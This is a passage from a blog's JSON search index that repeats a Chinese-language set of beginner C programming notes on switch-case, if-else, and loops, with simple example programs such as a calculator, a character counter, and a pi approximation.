... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#switch-case"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#简单的计算器程序"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符统计"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逻辑运算符"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#单目"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#双目"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include\u003cstdio.h\u003e int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include\u003cstdio.h\u003e int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include\u003cstdio.h\u003e double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#41循环"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数位数算法"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#while语句"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#do-while语句"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#统计数字位数"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逆向输出数字串"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求123n"},{"categories":["Programing"],"content":"\r4.1循环\r数位数算法 int x ; int n=0 ; scanf_s(\"%d\",\u0026x); n++; x=x/10; while(x\u003e0){ n++; x=x/10; } printf(\"该数字是%d位数\",n); 一个int是4个字节，一个字节是8位，int可表示最大数范围：2^(4*8)=2147483648 while语句 while ( x \u003e 0 ) { ... ... } do-while语句 do { \u003c循环体语句\u003e }while(\u003c循环体语句\u003e); 统计数字位数 #include int main(){ int num=0; int count=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ num=num/10; count++; }while(num!=0); printf(\"total:%d\",count); return 0; } 逆向输出数字串 #include int main(){ int num=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026num); do{ printf(\"%d\",num%10); num=num/10; }while(num!=0); return 0; } 求1!+2!+3!+……..n! #include double fact(int n); int main(){ int a=0; double sum=0; printf(\"Enter a number:\"); scanf(\"%d\",\u0026a); for(int i=1;i\u003c=a;i++){ sum=sum+fact(i); } printf(\"1!+2!+3!+....+%d!=%.0lf\\n\",a,sum); return 0; } double fact(int n){ double result=0; if(n\u003c0){ return 0; } result=1; for(int i=1;i\u003c=n;i++){ result=result*i; } return result; } while 和 do-while的区别：while先判断，do-while先执行一次 ","date":"2023-11-17","objectID":"/c_language_notes/:4:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#while-和-do-while的区别"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include\u003cstdio.h\u003e #include\u003cmath.h\u003e int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#42循环应用"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计数循环"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#格雷公式求π近似值"},{"categories":["Programing"],"content":"\r4.2循环应用\r计数循环 int count = 100; while(count \u003e=0){ cout --; printf(\"%d\\n\",count); } printf(\"发射\\n\"); 格雷公式求π近似值 #include #include int main(){ int demo=1; int flag=1; double eps,pi=0; double item=1.0; printf(\"Enter eps:\"); scanf(\"%lf\",\u0026eps); while(fabs(item)\u003e=eps){ pi=pi+item; flag=-flag; demo=demo+2; item=flag*(1.0/demo); } pi=pi+item; pi=pi*4; printf(\"pi=%.4f\\n\",pi); return 0; } 随机数每次召唤rand()就得到一个随机数 ","date":"2023-11-17","objectID":"/c_language_notes/:4:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#随机数"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#51循环控制"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 